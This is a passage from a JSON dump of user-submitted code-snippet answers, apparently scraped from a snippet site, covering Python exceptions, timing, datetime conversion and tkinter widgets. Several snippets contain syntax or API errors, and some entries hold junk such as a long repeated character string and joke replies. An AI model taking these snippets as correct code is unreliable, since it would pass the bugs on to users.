    "description": "raise Exception(\"Error\")\nraise Exception(\"message\")\nexcept Exception as e: print(e)\n# Raise is used to cause an error raise(Exception(\"Put whatever you want here!\")) raise(TypeError)\ntry:   print(\"I will try to print this line of code\") except:   print(\"I will print this line of code if an error is encountered\")\ntry:   # Dangerous stuff except ValueError:   # If you use try, at least 1 except block is mandatory!   # Handle it somehow / ignore except (BadThingError, HorrbileThingError) as e:   # Hande it differently except:   # This will catch every exception. else:   # Else block is not mandatory.   # Dangerous stuff ended with no exception finally:   # Finally block is not mandatory.   # This will ALWAYS happen after the above blocks.\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4494,
    "keyword": null,
    "link": null,
    "title": " throwing an exception python",
    "description": "raise Exception(\"message\")\ntry:   # code block except ValueError as ve:   print(ve)\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4495,
    "keyword": null,
    "link": null,
    "title": " tick labels vertical matplotlib",
    "description": "plt.xticks(rotation=45)\n",
    "reg_date": "2021-10-12T11:35:14.000Z"
  },
  {
    "id": 4496,
    "keyword": null,
    "link": null,
    "title": " ticks font size matplotlib",
    "description": "ax.tick_params(axis='both', which='major', labelsize=10)\n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4497,
    "keyword": null,
    "link": null,
    "title": " time",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\n// get current time in java using LocalTime.now() method  import java.time.LocalTime; public class UsingLocalDate {    public static void main(String[] args)    {       System.out.println(LocalTime.now());      // hr : min : sec.fimto sec    } }\nlook in your house, must have clock somewhere right?\nconsole.log(new Date().toUTCString());  // IF YOU REALLY WANT THE TIME, JUST LOOK AT YOUR SYSTEM CLOCK BTW.\n#python import time\na+a-b*(2345) x b = \n>>> from DateTime import DateTime >>> e = DateTime('US/Eastern') >>> e.timezone() 'US/Eastern' \n10' \nতুমি কোন দেশের?\n[     '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'     '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'     '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'     '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'     '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'     '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'     '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'     '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'     '%m/%d/%y %H:%M',        # '10/25/06 14:30' ] \n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4498,
    "keyword": null,
    "link": null,
    "title": " time (current)",
    "description": "import time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4499,
    "keyword": null,
    "link": null,
    "title": " time date in pandas to csv file",
    "description": "try:     df.to_csv(              path_to_csv + f'\\{file_name}_{now.strftime(\"%Y-%m-%d\")}_to_{now.strftime(\"%H.%M\")}.csv',              date_format='%Y-%m-%d %H:%M:%S', encoding='utf-8', index=False) except OSError as e:              print(\"Failed to create the file.......\")              raise SystemExit(e)\n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4500,
    "keyword": null,
    "link": null,
    "title": " time decorator python",
    "description": "from functools import wraps from time import time def measure(func):     @wraps(func)     def _time_it(*args, **kwargs):         start = int(round(time() * 1000))         try:             return func(*args, **kwargs)         finally:             end_ = int(round(time() * 1000)) - start             print(f\"Total execution time: {end_ if end_ > 0 else 0} ms\")     return _time_it @measure def hello():     print('hello world')  hello()\n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4501,
    "keyword": null,
    "link": null,
    "title": " time format conversion in python",
    "description": "import datetime  date_time_str = '2018-06-29 08:15:27.243860' date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')  print('Date:', date_time_obj.date()) print('Time:', date_time_obj.time()) print('Date-time:', date_time_obj) \n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4502,
    "keyword": null,
    "link": null,
    "title": " time it in jupyter notebook",
    "description": "%%time # to get a cell executation time # put %%time at the very start of the cell\n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4503,
    "keyword": null,
    "link": null,
    "title": " time it python",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\nimport time  start = time.time() print(\"hello\") end = time.time() print(end - start) \nimport time  # Calculate the power of two for a defined range of number def power_two(my_range):     return [x**2 for x in range(my_range)]   # Measure time def measure_time(func):     start = time.time()     func()               # any specific function to measure     end = time.time()     print(end - start)        measure_time(lambda: power_two(10000000)) # lambda permits to pass the argument of our function\nimport timeit import_module = \"import random\" testcode = '''  def test():      return random.randint(10, 100) ''' print(timeit.repeat(stmt=testcode, setup=import_module)) \nimport time timer_length = float(input(\"How many seconds would you like you're timer to be set for? \")) time.sleep(timer_length) print(\"Done!\")\nimport datetime  x = datetime.datetime.now()  print(x) \n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4504,
    "keyword": null,
    "link": null,
    "title": " time passed python",
    "description": "import time  start = time.time() print(\"hello\") end = time.time() print(end - start)\n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4505,
    "keyword": null,
    "link": null,
    "title": " timedelta to float",
    "description": "# instead, can convert timedelta to float of second time_d_float = time_d.total_seconds() \n",
    "reg_date": "2021-10-12T11:35:15.000Z"
  },
  {
    "id": 4506,
    "keyword": null,
    "link": null,
    "title": " timedelta year python",
    "description": "import datetime from dateutil.relativedelta import relativedelta  last_year = (datetime.datetime.now()-relativedelta(years=1)).strftime(\"%Y-%m-%d\")\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4507,
    "keyword": null,
    "link": null,
    "title": " timeout exception in selenium python",
    "description": "from selenium import webdriver from selenium.common.exceptions import TimeoutException  Driver = webdriver.Firefox() try:     Driver.set_page_load_timeout(1)     Driver.get(\"http://www.engadget.com\") except TimeoutException as ex:     isrunning = 0     print(\"Exception has been thrown. \" + str(ex))     Driver.close()\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4508,
    "keyword": null,
    "link": null,
    "title": " timer",
    "description": "gotta keep track of how long my breaks are lol\nimport time def converter(hours, minutes, seconds):   return hours * 3600 + minutes * 60 + seconds time.sleep(converter(hrs, mins, secs)) print(\"time's up\")\nget back to working and dont procrastinate\nimport time import sys time_left = int(input(\"How long would you like the timer to go (in seconds)? \")) check_for_decimal = time_left % 1  if check_for_decimal not 0:   print(\"Use a whole number pls\")   sys.exit()    if time_left < 1:   print(\"Please use a number greater than 0.\")   sys.exit()  while True:   time.sleep(1)   time_left -= 1   if time_left == 0:     print(\"Time's up!\")     break      # Since I'm such a good programmer (/s), I didn't test this at all :) # Let me know if there is an error and I will try to fix it.\nimport time length = int(input('How many seconds: ')) time.sleep(length) print('Time is up')\nimport turtle  t = turtle.Screen() t.forward(100)\n58s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s758s7\nDREAM DREAAAAM DREAAAAAAAAMMM DREEEEAAAM\nimport React from 'react'; import { useTimer } from 'react-timer-hook';  function MyTimer({ expiryTimestamp }) {   const {     seconds,     minutes,     hours,     days,     isRunning,     start,     pause,     resume,     restart,   } = useTimer({ expiryTimestamp, onExpire: () => console.warn('onExpire called') });     return (     <div style={{textAlign: 'center'}}>       <h1>react-timer-hook </h1>       <p>Timer Demo</p>       <div style={{fontSize: '100px'}}>         <span>{days}</span>:<span>{hours}</span>:<span>{minutes}</span>:<span>{seconds}</span>       </div>       <p>{isRunning ? 'Running' : 'Not running'}</p>       <button onClick={start}>Start</button>       <button onClick={pause}>Pause</button>       <button onClick={resume}>Resume</button>       <button onClick={() => {         // Restarts to 5 minutes timer         const time = new Date();         time.setSeconds(time.getSeconds() + 300);         restart(time)       }}>Restart</button>     </div>   ); }  export default function App() {   const time = new Date();   time.setSeconds(time.getSeconds() + 600); // 10 minutes timer   return (     <div>       <MyTimer expiryTimestamp={time} />     </div>   ); }\ngreppers use timer?  uwu\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4509,
    "keyword": null,
    "link": null,
    "title": " timestamp change python",
    "description": "import time timestamp = 1547281745 datetime = time.strftime('%A, %Y-%m-%d %H:%M:%S', time.localtime(timestamp)) print(datetime)\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4510,
    "keyword": null,
    "link": null,
    "title": " timestamp to date python",
    "description": "from datetime import datetime  timestamp = 1586507536367 dt_object = datetime.fromtimestamp(timestamp) \nimport datetime date = '18/05/2020 - 18:05:12'  # convert string to datetimeformat date = datetime.datetime.strptime(date, \"%d %m %Y - %H:%M:%S\"\")  # convert datetime to timestamp date = datetime.datetime.timestamp(date)\nimport time timestamp = 1547281745 datetime = time.strftime('%A, %Y-%m-%d %H:%M:%S', time.localtime(timestamp)) print(datetime)\nfrom datetime import datetime  timestamp = 1545730073 dt_object = datetime.fromtimestamp(timestamp)  print(\"dt_object =\", dt_object) print(\"type(dt_object) =\", type(dt_object))\nimport datetime now = datetime.datetime.today() timestamp = datetime.datetime.timestamp(now)\nfrom datetime import datetime  timestamp = 1545730073 dt_object = datetime.fromtimestamp(timestamp)  print(\"dt_object =\", dt_object) print(\"type(dt_object) =\", type(dt_object))  # Output  dt_object = \"2018-12-25 09:27:53\" type(dt_object) = <class 'datetime.datetime'>\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4511,
    "keyword": null,
    "link": null,
    "title": " timestamp to date time till milliseconds python",
    "description": "from datetime import datetime  print datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]  >>>> OUTPUT >>>> 2020-05-04 10:18:32.926\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4512,
    "keyword": null,
    "link": null,
    "title": " tk font list",
    "description": "{Abadi MT Condensed Extra Bold} {Abadi MT Condensed Light} {Al Bayan} {Al Nile} {Al Tarikh} {American Typewriter} {Andale Mono} Arial {Arial Black} {Arial Hebrew} {Arial Narrow} {Arial Rounded MT Bold} {Arial Unicode MS} Athelas Avenir {Avenir Next} {Avenir Next Condensed} Ayuthaya Baghdad {Bangla MN} {Bangla Sangam MN} {Baoli SC} Baskerville {Baskerville Old Face} Batang {Bauhaus 93} Beirut {Bell MT} {Bernard MT Condensed} BiauKai {Big Caslon} {Book Antiqua} {Bookman Old Style} {Bookshelf Symbol 7} Braggadocio {Britannic Bold} {Brush Script MT} Calibri {Calisto MT} Cambria {Cambria Math} Candara Century {Century Gothic} {Century Schoolbook} Chalkboard {Chalkboard SE} Chalkduster {Charcoal CY} Charter Cochin {Colonna MT} {Comic Sans MS} Consolas Constantia {Cooper Black} Copperplate {Copperplate Gothic Bold} {Copperplate Gothic Light} Corbel {Corsiva Hebrew} Courier {Courier New} {Curlz MT} Damascus {DecoType Naskh} Desdemona {Devanagari MT} {Devanagari Sangam MN} Didot {DIN Alternate} {DIN Condensed} {Diwan Kufi} {Diwan Thuluth} {Edwardian Script ITC} {Engravers MT} {Euphemia UCAS} Eurostile Farah Farisi {Footlight MT Light} {Franklin Gothic Book} {Franklin Gothic Medium} Futura Gabriola Garamond {GB18030 Bitmap} {Geeza Pro} Geneva {Geneva CY} Georgia {Gill Sans} {Gill Sans MT} {Gloucester MT Extra Condensed} {Goudy Old Style} {Gujarati MT} {Gujarati Sangam MN} Gulim GungSeo {Gurmukhi MN} {Gurmukhi MT} {Gurmukhi Sangam MN} Haettenschweiler {Hannotate SC} {Hannotate TC} {HanziPen SC} {HanziPen TC} Harrington HeadLineA Hei {Heiti SC} {Heiti TC} Helvetica {Helvetica CY} {Helvetica Neue} Herculanum {Hiragino Kaku Gothic Pro} {Hiragino Kaku Gothic ProN} {Hiragino Kaku Gothic Std} {Hiragino Kaku Gothic StdN} {Hiragino Maru Gothic Pro} {Hiragino Maru Gothic ProN} {Hiragino Mincho Pro} {Hiragino Mincho ProN} {Hiragino Sans GB} {Hoefler Text} Impact {Imprint MT Shadow} InaiMathi {Iowan Old Style} Kai Kailasa {Kaiti SC} {Kaiti TC} {Kannada MN} {Kannada Sangam MN} Kefa {Khmer MN} {Khmer Sangam MN} {Kino MT} Kokonor Krungthep KufiStandardGK {Lantinghei SC} {Lantinghei TC} {Lao MN} {Lao Sangam MN} {Libian SC} {LiHei Pro} {LiSong Pro} {Lucida Blackletter} {Lucida Bright} {Lucida Calligraphy} {Lucida Console} {Lucida Fax} {Lucida Grande} {Lucida Handwriting} {Lucida Sans} {Lucida Sans Typewriter} {Lucida Sans Unicode} {Malayalam MN} {Malayalam Sangam MN} Marion {Marker Felt} Marlett {Matura MT Script Capitals} Meiryo Menlo {Microsoft Sans Serif} Mishafi Mistral {Modern No. 20} Monaco {MS Gothic} {MS Mincho} {MS PGothic} {MS PMincho} {MS Reference Sans Serif} {MS Reference Specialty} Mshtakan {MT Extra} Muna {Myanmar MN} {Myanmar Sangam MN} Nadeem {Nanum Brush Script} {Nanum Gothic} {Nanum Myeongjo} {Nanum Pen Script} {New Peninim MT} {News Gothic MT} Noteworthy Onyx Optima {Oriya MN} {Oriya Sangam MN} Osaka Palatino {Palatino Linotype} Papyrus PCMyungjo Perpetua {Perpetua Titling MT} PilGi {Plantagenet Cherokee} Playbill PMingLiU {PT Mono} {PT Sans} {PT Sans Caption} {PT Sans Narrow} {PT Serif} {PT Serif Caption} Raanana Rockwell {Rockwell Extra Bold} Sana Sathu {Savoye LET} Seravek Silom SimSun {Sinhala MN} {Sinhala Sangam MN} Skia {Snell Roundhand} {Songti SC} {Songti TC} Stencil STFangsong STHeiti STIXGeneral STIXIntegralsD STIXIntegralsSm STIXIntegralsUp STIXIntegralsUpD STIXIntegralsUpSm STIXNonUnicode STIXSizeFiveSym STIXSizeFourSym STIXSizeOneSym STIXSizeThreeSym STIXSizeTwoSym STIXVariants STKaiti STSong Superclarendon Symbol Tahoma {Tamil MN} {Tamil Sangam MN} TeamViewer8 {Telugu MN} {Telugu Sangam MN} Thonburi Times {Times New Roman} {Trebuchet MS} {Tw Cen MT} Verdana Waseem {Wawati SC} {Wawati TC} Webdings {Weibei SC} {Weibei TC} {Wide Latin} Wingdings {Wingdings 2} {Wingdings 3} {Xingkai SC} {Yuanti SC} YuGothic YuMincho {Yuppy SC} {Yuppy TC} {Zapf Dingbats} Zapfino {Apple Braille} {Apple Chancery} {Apple Color Emoji} {Apple LiGothic} {Apple LiSung} {Apple SD Gothic Neo} {Apple Symbols} AppleGothic AppleMyungjo {Monotype Corsiva} {Monotype Sorts}\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4513,
    "keyword": null,
    "link": null,
    "title": " tk table python",
    "description": "try:     from tkinter import *  except ImportError:     from Tkinter import *  root = Tk()  height = 5 width = 5 for i in range(height): #Rows     for j in range(width): #Columns         b = Entry(root, text=\"\")         b.grid(row=i, column=j)  mainloop() \n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4514,
    "keyword": null,
    "link": null,
    "title": " tkfiledialog python 3 example",
    "description": "filename2 =  filedialog.askopenfilename(title = \"Select file\",filetypes = ((\"Excel files\", \".xlsx .xls\"),))\nfrom  tkinter import * root = Tk() root.filename =  filedialog.askopenfilename(initialdir = \"E:/Images\",title = \"choose your file\",filetypes = ((\"jpeg files\",\"*.jpg\"),(\"all files\",\"*.*\"))) print (root.filename) root.withdraw() \n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4515,
    "keyword": null,
    "link": null,
    "title": " tkiner border",
    "description": "from tkinter import * root = Tk()  example = Label(root, Text=\"Hello World!\", borderwidth=\"2\", relief=\"groove\") # Releif is the effect what goes with the border. #\" flat\", \"raised\", \"sunken\", \"ridge\", \"solid\" are relief commands too.  root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:16.000Z"
  },
  {
    "id": 4516,
    "keyword": null,
    "link": null,
    "title": " tkinter app icon",
    "description": "import tkinter as tk  root = tk.Tk() root.iconbitmap(\"myIcon.ico\")\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4517,
    "keyword": null,
    "link": null,
    "title": " tkinter background color",
    "description": "root.configure(background='black')\nwindow_name.configure(background='black')\n#Import: from tkinter import *  #Create Window: new_window = Tk() new_window.title(\"Hello World\") new_window.geometry(\"300x250\") #Adding the background color: new_window.config(bg = \"red\")  #new_window tells us that we are setting up something for the new window #.config() means that we want to configure something on the screen #bg tells that the background needs to be changed #\"red\" tells us what should the background color be ; it can also be a hex code  new_window.mainloop()\ngui.configure(background=\"light green\")\n new_window.config(bg = \"red\")\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4518,
    "keyword": null,
    "link": null,
    "title": " tkinter basic",
    "description": "from tkinter import Tk, Label, Button  class MyFirstGUI:     def __init__(self, master):         self.master = master         master.title(\"A simple GUI\")          self.label = Label(master, text=\"This is our first GUI!\")         self.label.pack()          self.greet_button = Button(master, text=\"Greet\", command=self.greet)         self.greet_button.pack()          self.close_button = Button(master, text=\"Close\", command=master.quit)         self.close_button.pack()      def greet(self):         print(\"Greetings!\")  root = Tk() my_gui = MyFirstGUI(root) root.mainloop() \nfrom tkinter import * from tkinter import ttk  def calculate(*args):     try:         value = float(feet.get())         meters.set(int(0.3048 * value * 10000.0 + 0.5)/10000.0)     except ValueError:         pass  root = Tk() root.title(\"Feet to Meters\")  mainframe = ttk.Frame(root, padding=\"3 3 12 12\") mainframe.grid(column=0, row=0, sticky=(N, W, E, S)) root.columnconfigure(0, weight=1) root.rowconfigure(0, weight=1)  feet = StringVar() feet_entry = ttk.Entry(mainframe, width=7, textvariable=feet) feet_entry.grid(column=2, row=1, sticky=(W, E))  meters = StringVar() ttk.Label(mainframe, textvariable=meters).grid(column=2, row=2, sticky=(W, E))  ttk.Button(mainframe, text=\"Calculate\", command=calculate).grid(column=3, row=3, sticky=W)  ttk.Label(mainframe, text=\"feet\").grid(column=3, row=1, sticky=W) ttk.Label(mainframe, text=\"is equivalent to\").grid(column=1, row=2, sticky=E) ttk.Label(mainframe, text=\"meters\").grid(column=3, row=2, sticky=W)  for child in mainframe.winfo_children():      child.grid_configure(padx=5, pady=5)  feet_entry.focus() root.bind(\"<Return>\", calculate)  root.mainloop() \n# check this code first. from tkinter import *  app = Tk() # The title of the project app.title(\"The title of the project\") # The size of the window app.geometry(\"400x400\")  # Defining a funtion def c():     # Label     m = Label(app, text=\"Text\")     m.pack()   # Button l = Button(app, text=\"The text of the Butoon\", command=c) # Packing the Button l.pack() app.mainloop() # Quick Note :  # When you put a command you should not use parentheses # l = Button(app, text=\"The text of the Butoon\", command=c) # l = Button(app, text=\"The text of the Butoon\", command=c())\nimport tkinter as tk root = tk.Tk() root.title(\"my title\") root.geometry('200x150') root.configure(background='black')  #\tenter widgets here  root.mainloop()\nbutton = tk.Button(     text=\"Click me!\",     width=25,     height=5,     bg=\"blue\",     fg=\"yellow\", ) \nimport tkinter as tk  window = tk.Tk()  frame_a = tk.Frame() frame_b = tk.Frame()  label_a = tk.Label(master=frame_a, text=\"I'm in Frame A\") label_a.pack()  label_b = tk.Label(master=frame_b, text=\"I'm in Frame B\") label_b.pack()  frame_a.pack() frame_b.pack()  window.mainloop() \n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4519,
    "keyword": null,
    "link": null,
    "title": " tkinter boiler plate",
    "description": "# A simple object oriented tkinter window import tkinter as tk from tkinter import ttk   # -- Windows only configuration -- try:     from ctypes import windll     windll.shcore.SetProcessDpiAwareness(1) except:     pass           class HelloWorld(tk.Tk):     def __init__(self):         super().__init__()          self.geometry(\"640x200\")         self.title(\"Title Here\")          label = ttk.Label(self, text=\"Tkinet window\")         label.config(font=(\"Comic Sans MS\",40))         label.pack()  root = HelloWorld()   root.mainloop()\n# A simple tkinter window import tkinter as tk from tkinter import ttk  # -- Windows only configuration -- try:     from ctypes import windll     windll.shcore.SetProcessDpiAwareness(1) except:     pass # -- End Windows only configuration --   root = tk.Tk() root.geometry(\"640x200\") root.title(\"Title Here\")  label = ttk.Label(root, padding=10, text=\"Tkinter Window\") label.config(font=(\"Comic Sans MS\",40)) label.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4520,
    "keyword": null,
    "link": null,
    "title": " tkinter boilerplate",
    "description": "# A simple object oriented tkinter window import tkinter as tk from tkinter import ttk   # -- Windows only configuration -- try:     from ctypes import windll     windll.shcore.SetProcessDpiAwareness(1) except:     pass           class HelloWorld(tk.Tk):     def __init__(self):         super().__init__()          self.geometry(\"640x200\")         self.title(\"Title Here\")          label = ttk.Label(self, text=\"Tkinet window\")         label.config(font=(\"Comic Sans MS\",40))         label.pack()  root = HelloWorld()   root.mainloop()\n# A simple tkinter window import tkinter as tk from tkinter import ttk  # -- Windows only configuration -- try:     from ctypes import windll     windll.shcore.SetProcessDpiAwareness(1) except:     pass # -- End Windows only configuration --   root = tk.Tk() root.geometry(\"640x200\") root.title(\"Title Here\")  label = ttk.Label(root, padding=10, text=\"Tkinter Window\") label.config(font=(\"Comic Sans MS\",40)) label.pack()  root.mainloop()\nimport tkinter  window = tkinter.Tk()       # creating the window object window.title('my first GUI program') # write your code here  window.mainloop()           # keeping the window until we close it\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4521,
    "keyword": null,
    "link": null,
    "title": " tkinter button background color mac",
    "description": "#Use highlightbackground=color #For example:  submit = Button(root, text=\"Generate\", highlightbackground='#3E4149')\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4522,
    "keyword": null,
    "link": null,
    "title": " tkinter canvas remove",
    "description": "from Tkinter import *   a = Tk()  canvas = Canvas(a, width = 500, height = 500) canvas.pack()  myrect = canvas.create_rectangle(0,0,100,100) canvas.delete(myrect) #Deletes the rectangle\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4523,
    "keyword": null,
    "link": null,
    "title": " tkinter center frame",
    "description": "imageFrame.place(relx=0.5, rely=0.5, anchor=tk.CENTER)\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4524,
    "keyword": null,
    "link": null,
    "title": " tkinter change Menu color",
    "description": "menubar = Menu(app, background='blue', fg='white')\n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4525,
    "keyword": null,
    "link": null,
    "title": " tkinter change font family and size of label",
    "description": "from tkinter import * import tkinter.font as font  gui = Tk(className='Python Examples - Button') gui.geometry(\"500x200\")  # define font myFont = font.Font(family='Helvetica', size=20, weight='bold')  # create button button = Button(gui, text='My Button', bg='#0052cc', fg='#ffffff') # apply font to the button label button['font'] = myFont # add button to gui window button.pack()  gui.mainloop() \n",
    "reg_date": "2021-10-12T11:35:17.000Z"
  },
  {
    "id": 4526,
    "keyword": null,
    "link": null,
    "title": " tkinter change label text color",
    "description": "label_name.configure(foreground=\"blue\")\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4527,
    "keyword": null,
    "link": null,
    "title": " tkinter clear entry",
    "description": "widget.delete(0, END)\n# Clear an entry widget on button press from tkinter import *  root = Tk()  def clearEntryInput():     entry.delete(0, END)  entry = Entry(root, width=30) # You must .pack() or .grid() on the next line entry.pack()  Button(root, text=\"Clear\", command=clearEntryInput).pack()  root.mainloop()  # This is the error you get if you .pack() or .grid() on the same line: # AttributeError: 'NoneType' object has no attribute 'delete' # https://stackoverflow.com/questions/13002843/attributeerror-nonetype-object-has-no-attribute-delete\ntk = Tk() tk.destroy()\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4528,
    "keyword": null,
    "link": null,
    "title": " tkinter e.delete(0,END)",
    "description": "## CLear a TKinter box import tkinter as tk  class App(tk.Frame):     def __init__(self, master):         tk.Frame.__init__(self, master, height=42, width=42)         self.entry = tk.Entry(self)         self.entry.focus()         self.entry.pack()         self.clear_button = tk.Button(self, text=\"Clear text\", command=self.clear_text)         self.clear_button.pack()      def clear_text(self):         self.entry.delete(0, 'end')  def main():     root = tk.Tk()     App(root).pack(expand=True, fill='both')     root.mainloop()  if __name__ == \"__main__\":     main()\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4529,
    "keyword": null,
    "link": null,
    "title": " tkinter entry default value",
    "description": "# Use .insert entry_box = tkinter.Entry(root) entry_box.insert(END, 'default text')\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4530,
    "keyword": null,
    "link": null,
    "title": " tkinter entry focus",
    "description": "entry = Entry(root).pack() entry.focus()\nfrom Tkinter import * root = Tk() frame=Frame(root,width=100,heigh=100,bd=11) frame.pack() label = Label(frame,text=\"Enter a digit that you guessed:\").pack() entry= Entry(frame,bd=4) entry.pack() entry.focus() button1=Button(root,width=4,height=1,text='ok') button1.pack()  root.mainloop()\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4531,
    "keyword": null,
    "link": null,
    "title": " tkinter execute function on enter",
    "description": "def func(event):     print(\"You hit return.\")      root.bind('<Return>', func)\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4532,
    "keyword": null,
    "link": null,
    "title": " tkinter give button 2 commands",
    "description": "button = Button(root, text=\"test\", command=lambda:[funct1(),funct2()])\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4533,
    "keyword": null,
    "link": null,
    "title": " tkinter how to make a root non rezizable",
    "description": "root.resizable(False, False)\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4534,
    "keyword": null,
    "link": null,
    "title": " tkinter how to remove button boder",
    "description": "bd=0\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4535,
    "keyword": null,
    "link": null,
    "title": " tkinter image",
    "description": "pip install Pillow\nimport tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nfrom tkinter import * from PIL import ImageTk, Image  root = Tk()  c = Canvas(root, width=500, height=500) c.pack()  img = ImageTk.PhotoImage(Image.open(r\"imagepath\\imagename.extension\")) c.create_image(x, y, image=img, anchor=NW)\nfrom tkinter import *       root = Tk()       canvas = Canvas(root, width = 300, height = 300)       canvas.pack()       img = PhotoImage(file=\"ball.ppm\")       canvas.create_image(20,20, anchor=NW, image=img)       mainloop() \nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4536,
    "keyword": null,
    "link": null,
    "title": " tkinter info box",
    "description": "from tkinter import messagebox  messagebox.showinfo('Title', 'Information')\n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4537,
    "keyword": null,
    "link": null,
    "title": " tkinter label border",
    "description": "from tkinter import * root = Tk()  example = Label(root, Text=\"Hello World!\", borderwidth=\"2\", relief=\"groove\") # Releif is the effect what goes with the border. #\" flat\", \"raised\", \"sunken\", \"ridge\", \"solid\" are relief commands too.  root.mainloop()\nl1 = Label(root, text=\"This\", borderwidth=2, relief=\"groove\") \n",
    "reg_date": "2021-10-12T11:35:18.000Z"
  },
  {
    "id": 4538,
    "keyword": null,
    "link": null,
    "title": " tkinter label textvariable example",
    "description": "var = StringVar() var.set('hello')  l = Label(root, textvariable = var) l.pack()\n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4539,
    "keyword": null,
    "link": null,
    "title": " tkinter load image",
    "description": "pip install Pillow\nimport tkinter as tk from PIL import Image, ImageTk  root = tk.Tk() img = Image.open(\"path\\\\to\\\\imgage.jpg\") img = img.resize((250, 250)) tkimage = ImageTk.PhotoImage(img) tk.Label(root, image=tkimage).grid()\nfrom tkinter import *       root = Tk()       canvas = Canvas(root, width = 300, height = 300)       canvas.pack()       img = PhotoImage(file=\"ball.ppm\")       canvas.create_image(20,20, anchor=NW, image=img)       mainloop() \nfrom tkinter import * from PIL import ImageTk, Image  root = Tk()  c = Canvas(root, width=500, height=500) c.pack()  img = ImageTk.PhotoImage(Image.open(r\"imagepath\\imagename.extension\")) c.create_image(x, y, image=img, anchor=NW)\nimport tkinter as tk window = tk() canvas = Canvas(window, width=300, height=300) image = PhotoImage('path') canvas.create_image(height=40, width=40, img=image) \n",
    "reg_date": "2021-10-12T11:35:19.000Z"
  },
  {
    "id": 4540,
    "keyword": null,
    "link": null,
